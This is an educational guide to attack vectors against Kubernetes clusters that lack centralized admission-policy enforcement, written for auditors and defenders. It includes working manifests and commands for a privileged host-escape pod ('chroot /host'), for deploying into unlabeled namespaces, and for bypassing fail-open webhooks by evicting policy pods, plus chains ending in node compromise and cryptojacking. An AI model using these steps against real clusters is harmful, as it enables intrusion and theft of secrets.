# K04: Lack of Centralized Policy Enforcement - Attack Vectors

## Table of Contents
- [Understanding the Attack Surface](#understanding-the-attack-surface)
- [Core Attack Flow](#core-attack-flow)
- [Common Attack Patterns](#common-attack-patterns)
- [Chaining the Enforcement Gap](#chaining-the-enforcement-gap)

## Understanding the Attack Surface

> **⚠️ EDUCATIONAL PURPOSE ONLY** — the techniques below are shown so you can find and close these gaps in clusters you own or are authorised to test.

The absence of centralized policy enforcement is not exploited with a clever payload. It is exploited by **submitting a manifest that should have been rejected and watching it run**. The vulnerability *is* that nothing says no. Anyone who can create a workload—a developer, a CI service account, a compromised token, an attacker who reached the API—can define exactly how their container runs, and the cluster complies.

The attacker's goal in this category is usually one of:

- Deploy a workload with privileges that a policy engine would have blocked (privileged, host namespaces, `hostPath`).
- Run an untrusted or unsigned image because nothing validates provenance.
- Land in a namespace or cluster that enforcement does not cover.
- Wait for (or trigger) a fail-open condition so even existing policy stops applying.

### Core Attack Flow

```
1. Probe for enforcement
   |
   Try to create a trivial privileged pod; read webhook/PSA config
2. Map the gaps
   |
   Which namespaces/clusters are unguarded? audit-only? fail-open?
3. Deploy the workload that should have been blocked
   |
   privileged / hostPath / hostPID / untrusted image
4. Escape & escalate
   |
   Break to the node, read secrets, pivot, or mine crypto
```

## Common Attack Patterns

### 1. Probe: Deploy a Canary Privileged Pod

The single fastest test for missing enforcement is to try to create the thing that should always be refused.

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: canary
spec:
  containers:
  - name: c
    image: busybox
    command: ["sleep", "3600"]
    securityContext:
      privileged: true          # a restricted/baseline policy MUST reject this
```

```
kubectl apply -f canary.yaml
# Enforced cluster:  Error ... admission webhook denied the request /
#                    violates PodSecurity "restricted"
# K04 cluster:       pod/canary created        <-- nothing stopped it
```

**Payoff**: a one-line confirmation of whether the cluster enforces anything at all—the reconnaissance step for every pattern below.

### 2. Read the Enforcement Configuration Directly

If the attacker (or auditor) has read access, the gaps are visible without deploying anything.

```
# Is any policy engine wired into the admission path?
kubectl get validatingwebhookconfigurations
kubectl get mutatingwebhookconfigurations

# Which namespaces actually ENFORCE Pod Security Admission?
kubectl get ns -o custom-columns=\
NAME:.metadata.name,\
ENFORCE:.metadata.labels.pod-security\.kubernetes\.io/enforce

# Namespaces with no enforce label, or only warn/audit, are open doors.
```

**Payoff**: a map of unguarded namespaces and audit-only policies—exactly where to deploy.

### 3. Target the Unlabeled / Excluded Namespace

Enforcement is frequently applied to `prod` but not to `default`, `sandbox`, `legacy`, or newly created namespaces. Policy engines are also often configured to *exclude* system namespaces, which then become the soft landing spot.

```
# If 'prod' enforces 'restricted' but 'default' has no label,
# just deploy the privileged workload where nothing is watching:
kubectl apply -n default -f privileged-workload.yaml   # admitted
```

**Payoff**: full privileged deployment in a cluster that *looks* governed because one namespace is.

### 4. Exploit Audit/Warn-Only Mode

When policies are deployed in `audit` or `warn` mode, the workload is admitted and only a log line or a client warning is produced—which nobody blocks on.

```
# PSA in warn mode still ADMITS the pod:
$ kubectl apply -f privileged.yaml
Warning: would violate PodSecurity "restricted:latest": privileged ...
pod/privileged created            <-- created anyway
```

**Payoff**: the security team believes policy is "on," while every insecure workload still runs. The warning is noise, not a control.

### 5. Deploy a Host-Escape Workload

With no enforcement, the classic escape primitives are simply submitted as normal specs.

```yaml
spec:
  hostPID: true                 # see and signal host processes
  hostNetwork: true             # sniff/impersonate on the node network
  volumes:
  - name: host
    hostPath:
      path: /                   # mount the entire node filesystem
  containers:
  - name: c
    image: busybox
    securityContext:
      privileged: true
    volumeMounts:
    - { name: host, mountPath: /host }
```

```
# From inside the pod, the node root is now writable:
chroot /host sh
# read every pod's secrets, the kubelet kubeconfig, add an SSH key, etc.
```

**Payoff**: container-to-node escape and, via the kubelet credentials or mounted service-account tokens, a path to cluster-wide compromise. A `restricted` PSA profile or a Kyverno/Gatekeeper rule forbidding host namespaces and `hostPath` would have rejected this manifest outright.

### 6. Run an Untrusted or Unsigned Image

Without image/registry/signature policy, provenance is never checked.

```yaml
spec:
  containers:
  - name: c
    image: public.example-registry.io/anon/tool:latest   # unapproved registry
    # no signature verification anywhere in the admission path
```

**Payoff**: a poisoned, typosquatted, or attacker-controlled image runs inside the cluster. Registry allow-listing and signature verification (Cosign via Kyverno, or a Gatekeeper external-data check) would have refused it.

### 7. Abuse a Fail-Open Webhook

A validating webhook with `failurePolicy: Ignore` stops enforcing whenever the policy pod is unavailable. An attacker who can disrupt the policy engine—or who simply deploys during an outage or upgrade—bypasses policy entirely.

```yaml
webhooks:
- name: validate.kyverno.svc
  failurePolicy: Ignore          # <-- if the engine is down, ADMIT anyway
  ...
# Delete/evict the policy pods (if RBAC allows) or exploit a restart window,
# then deploy the workload the webhook would have blocked.
```

**Payoff**: enforcement becomes optional. Fail-open turns a reliability event into a security bypass. Sensitive resources should use `failurePolicy: Fail`.

### 8. Escape a Newly Created Namespace

Pod Security Admission only applies where the namespace is labeled. If namespace creation does not automatically apply enforce labels (for example via a policy that mutates new namespaces, or a cluster-wide default via the PSA admission configuration), each new namespace is born unguarded.

```
kubectl create namespace attacker-space   # no PSA labels by default
kubectl apply -n attacker-space -f privileged.yaml   # admitted
```

**Payoff**: an attacker with namespace-create permission manufactures their own policy-free zone.

### 9. Bypass CI/Review by Applying Directly

Organisations that rely on manifest review in pull requests (instead of admission control) are bypassed by anything that does not go through the pipeline.

```
# The reviewed Git repo says runAsNonRoot: true.
# The attacker/careless dev never touches Git:
kubectl apply -f my-privileged-pod.yaml     # straight to the API server
helm install sketchy ./chart                # operator/chart creates pods directly
```

**Payoff**: "we review YAML" is not enforcement. Only an engine in the admission path covers direct applies, Helm, and operators.

### 10. Exploit Missing Resource / Label Policy for Denial of Service

Without enforced resource limits, a single workload can starve a node; without required labels, workloads evade network policy and quotas that are keyed on labels.

```yaml
spec:
  containers:
  - name: c
    image: stress
    # no resources.limits -> can consume all CPU/memory on the node
    # no team/tier labels -> escapes NetworkPolicy selectors and quotas
```

**Payoff**: noisy-neighbour DoS and evasion of controls that assume every workload carries limits and labels—both of which a policy engine can require at admission.

## Chaining the Enforcement Gap

The enforcement gap is rarely the whole attack—it is the multiplier that turns a foothold into a breach:

```
Leaked CI service-account token (create pods)
        +
No admission policy in the target namespace
        -> deploy a privileged, hostPath:/ pod
        -> chroot to the node, read the kubelet kubeconfig
        =  node -> cluster-admin, full compromise, no cluster CVE needed
```

Another common chain:

```
Exposed dashboard / weak RBAC lets an attacker create workloads
        +
Policies exist but only in audit mode
        -> deploy a cryptominer image from an arbitrary registry
        -> it runs; the audit log records a violation nobody reads
        =  persistent cryptojacking inside a "governed" cluster
```

And the drift chain:

```
Cluster upgraded past 1.25, PodSecurityPolicy removed
        +
No PSA labels or policy engine adopted first
        +
No conformance scanning to notice the missing guardrail
        -> every previously-blocked workload is now admitted
        =  silent, cluster-wide loss of enforcement
```

## Key Takeaways

1. **The exploit is the manifest itself**—missing enforcement is proven by deploying what should be denied.
2. **One privileged canary pod** tells an attacker (or you) everything about whether the cluster enforces.
3. **Gaps live at the edges**—unlabeled namespaces, excluded system namespaces, new namespaces, and audit-only policies.
4. **Fail-open is a bypass**—a webhook that ignores its own outage makes enforcement optional.
5. **Review is not enforcement**—direct applies, Helm, and operators sail past pull-request checks.

## Next Steps

- **[Prevention Guide](prevention.md)**: Build uniform, fail-closed enforcement
- **[Code Examples](examples.md)**: No-policy cluster vs. Kyverno / Gatekeeper / PSA
- **[Kubernetes Learning Path](/learn/kubernetes)**: Continue the Kubernetes Top 10
- **[Practice](/practice)**: Apply these concepts hands-on
